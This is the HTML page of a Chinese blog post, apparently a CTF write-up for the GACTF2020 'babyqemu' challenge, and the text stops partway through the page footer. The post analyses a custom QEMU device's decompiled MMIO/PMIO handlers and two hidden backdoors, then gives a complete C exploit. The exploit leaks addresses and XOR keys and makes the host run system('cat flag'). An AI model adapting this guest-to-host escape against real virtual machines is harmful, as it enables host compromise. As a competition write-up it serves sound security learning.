@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="GACTF2020babyqemu漏洞分析看下启动脚本，发现自定义了一个设备，应该洞就出在这里 12345678#!/bin/sh./qemu-system-x86_64 \    -kernel /vmlinuz-4.8.0-52-generic  \    -append &quot;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet&quot;  \">
+<meta name="keywords" content="CTF writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gactf2020">
+<meta property="og:url" content="http://yoursite.com/2020/09/02/gactf2020/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="GACTF2020babyqemu漏洞分析看下启动脚本，发现自定义了一个设备，应该洞就出在这里 12345678#!/bin/sh./qemu-system-x86_64 \    -kernel /vmlinuz-4.8.0-52-generic  \    -append &quot;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet&quot;  \">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/09/02/gactf2020/1.png">
+<meta property="og:updated_time" content="2020-09-02T08:46:33.971Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="gactf2020">
+<meta name="twitter:description" content="GACTF2020babyqemu漏洞分析看下启动脚本，发现自定义了一个设备，应该洞就出在这里 12345678#!/bin/sh./qemu-system-x86_64 \    -kernel /vmlinuz-4.8.0-52-generic  \    -append &quot;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet&quot;  \">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/02/gactf2020/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/09/02/gactf2020/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>gactf2020 | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/02/gactf2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">gactf2020
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-09-02 16:43:40 / Modified: 16:46:33" itemprop="dateCreated datePublished" datetime="2020-09-02T16:43:40+08:00">2020-09-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/GACTF2020/" itemprop="url" rel="index"><span itemprop="name">GACTF2020</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/09/02/gactf2020/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/09/02/gactf2020/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/09/02/gactf2020/" class="leancloud_visitors" data-flag-title="gactf2020">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="GACTF2020"><a href="#GACTF2020" class="headerlink" title="GACTF2020"></a>GACTF2020</h1><h2 id="babyqemu"><a href="#babyqemu" class="headerlink" title="babyqemu"></a>babyqemu</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>看下启动脚本，发现自定义了一个设备，应该洞就出在这里</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -kernel /vmlinuz-4.8.0-52-generic  \</span><br><span class="line">    -append <span class="string">"console=ttyS0 root=/dev/ram oops=panic panic=1 quiet"</span>  \</span><br><span class="line">    -initrd /rootfs.cpio  \</span><br><span class="line">    -m 2G -nographic \</span><br><span class="line">    -L /pc-bios -smp 1 \</span><br><span class="line">    -device denc</span><br></pre></td></tr></table></figure>
+<p>逆一下找到mmio和pmio，发现有个带范围的地址读/写，调试一下发现0x20处有个elf的函数地址，借此可以得到proc_base进而得到system函数地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">denc_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = addr &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &amp; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">0xB20</span> + <span class="number">4</span> * (addr &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">denc_mmio_write</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(addr &amp; <span class="number">3</span>) &amp;&amp; addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)(a1 + <span class="number">0xAF8</span> + addr);</span><br><span class="line">      *(_DWORD *)(<span class="number">4</span> * (addr &gt;&gt; <span class="number">2</span>) + a1 + <span class="number">0xB20</span>) = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">denc_pmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a3 != <span class="number">4</span> || a2 &amp; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">0xB20</span> + <span class="number">4</span> * (a2 &gt;&gt; <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">denc_pmio_write</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(addr &amp; <span class="number">3</span>) &amp;&amp; addr &lt;= <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)(a1 + <span class="number">0xAF8</span> + <span class="number">4</span> * addr);</span><br><span class="line">      *(_DWORD *)(<span class="number">4</span> * addr + a1 + <span class="number">0xB20</span>) = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为好久没调试qemu的题了，这里还是写点备忘，调试的时候先写exp，<code>gcc ./exp.c -static -o exp</code>静态编译后拿<code>find . | cpio -o --format=newc &gt; ../rootfs.cpio</code>打包到文件系统里，启动qemu后拿<code>ps -aux | grep qemu</code>看下进程号，<code>sudo gdb attach -q [pid]</code>跟进去，如果函数调用比较多可以先不attach，等到getchar执行时再跟。</p>
+<p><img src="/2020/09/02/gactf2020/1.png" alt="mem"></p>
+<p>之后打算找个函数调用的位置，开始没找到，因为IDA的问题，之后查看system_ptr的引用，发现了mmio_read的一处隐藏后门，在输入地址是0x660和0x664时会leak出system_compat函数的libc地址，到这里其实也没什么用，毕竟我们已经有system@plt了，但是这启发了我们去看汇编，终于最后在pmio_write里发现了另一处后门，当输入地址是0x660时触发调用刚才函数指针的位置。参数为偏移为0的地址内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000003AA14A                 cmp     [rbp+var_20], 660h</span><br><span class="line">.text:00000000003AA152                 jnz     short locret_3AA17C</span><br><span class="line">.text:00000000003AA154                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000003AA158                 mov     rax, [rax+0B40h]</span><br><span class="line">.text:00000000003AA15F                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:00000000003AA163                 lea     rcx, [rdx+0B20h]</span><br><span class="line">.text:00000000003AA16A                 mov     edx, 0</span><br><span class="line">.text:00000000003AA16F                 mov     esi, 0</span><br><span class="line">.text:00000000003AA174                 mov     rdi, rcx</span><br><span class="line">.text:00000000003AA177                 call    rax</span><br></pre></td></tr></table></figure>
+<p>qemu启动时会通过读取随机数到heap上，每次赋值前要和对应的随机数异或，因此先通过异或0让它们的值leak出，随后写入system@plt以及<code>cat flag</code>字符串</p>
+<h3 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pmio_read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint64_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pmio_abread(<span class="keyword">uint64_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint64_t</span> offset,<span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//leak proc base</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_high = mmio_read(<span class="number">0x24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc high 0x%x\n"</span>,proc_high);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> proc_low  = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc low 0x%x\n"</span>,proc_low);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> proc_base = ((proc_high * <span class="number">0x100000000</span>)+proc_low<span class="number">-3841704</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"proc base 0x%llx\n"</span>,proc_base);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = proc_base + <span class="number">0x2ccb60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system addr 0x%llx\n"</span>,system_addr);</span><br><span class="line">    <span class="comment">//leak rand1</span></span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x24</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand1 = ((<span class="keyword">uint32_t</span>)(mmio_read(<span class="number">4</span>))*<span class="number">0x100000000</span>)+((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rand1 val:0x%llx\n"</span>,rand1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tail = mmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tail val:0x%x\n"</span>,tail);</span><br><span class="line">    <span class="comment">//leak rand2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand2 = ((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0x24</span>)*<span class="number">0x100000000</span>)+((<span class="keyword">uint32_t</span>)mmio_read(<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"rand2 val:0x%llx\n"</span>,rand2);</span><br><span class="line">    <span class="comment">//write command</span></span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0x20746163</span>^(rand1&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x67616c66</span>^(rand1&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    mmio_write(<span class="number">8</span>,tail);</span><br><span class="line">    <span class="comment">//write system</span></span><br><span class="line">    mmio_write(<span class="number">0x20</span>,(system_addr&amp;<span class="number">0xffffffff</span>)^(rand2));</span><br><span class="line">    mmio_write(<span class="number">0x24</span>,(system_addr&gt;&gt;<span class="number">32</span>)^(rand2&gt;&gt;<span class="number">32</span>));</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0x660</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>这里有个地方困扰我很久，在写入数据的时候只能写入0/0x20，而不能写入0x4/0x24。之后发现mmio_write函数写的有问题，把uint64_t改成32即可。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
